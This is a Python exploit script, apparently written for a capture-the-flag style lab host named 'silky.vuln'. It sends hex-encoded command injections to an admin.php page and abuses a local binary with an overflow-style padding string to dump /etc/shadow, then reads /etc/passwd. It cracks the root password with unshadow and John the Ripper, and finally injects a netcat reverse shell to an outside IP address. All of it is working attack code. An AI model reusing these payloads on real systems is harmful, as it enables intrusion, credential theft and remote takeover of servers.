import requests
from bs4 import BeautifulSoup
import os
import subprocess
import time

burp0_url = "http://silky.vuln:80/admin.php?username=%2f%68%6f%6d%65%2f%73%69%6c%6b%79%2f%63%61%74%5f%73%68%61%64%6f%77%20%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%62%59%6c%49&password=test"
burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://silky.vuln/admin.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
data = requests.get(burp0_url, headers=burp0_headers)
soup = BeautifulSoup(data.text, 'html.parser')

strips = list(soup.stripped_strings)
shadowContents = strips[6].splitlines()
f = open("shadowContents.txt", "w")
f.write(shadowContents[0])
f.close()

burp1_url = "http://silky.vuln:80/admin.php?username=%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64&password=test"
data2 = requests.get(burp1_url, headers=burp0_headers)
soup2 = BeautifulSoup(data2.text, 'html.parser')
strips2 = list(soup2.stripped_strings)
passwdContents = strips2[6].splitlines()
f2 = open("passwdContents.txt", "w")
f2.write(passwdContents[0])
f2.close()

cmd = 'unshadow passwdContents.txt shadowContents.txt > /tmp/fileForJohn.txt'
cmd2 = 'john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt /tmp/fileForJohn.txt'

os.system(cmd)
p = subprocess.Popen(cmd2, stdout=subprocess.PIPE, shell=True)
responseList = []
for line in p.stdout:
        stripped_line = line.strip()
        line_list = stripped_line.split()
        responseList.append(line_list)
roughRootPass = str(responseList[-1][0])
betterRootPass = roughRootPass.replace("b'", "")
finalRootPass = betterRootPass.replace("'", "")
print("Root Password Found!: " + str(finalRootPass))
p.wait()

try:
        burp2_url = "http://silky.vuln:80/admin.php?username=%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%30%2e%30%2e%31%31%2e%31%31%36%20%37%37%38%38&password=test"
        requests.get(burp2_url, headers=burp0_headers)
        print("Low privilege shell connected!")
except:
        print("Initial low privilege reverse shell failed.")
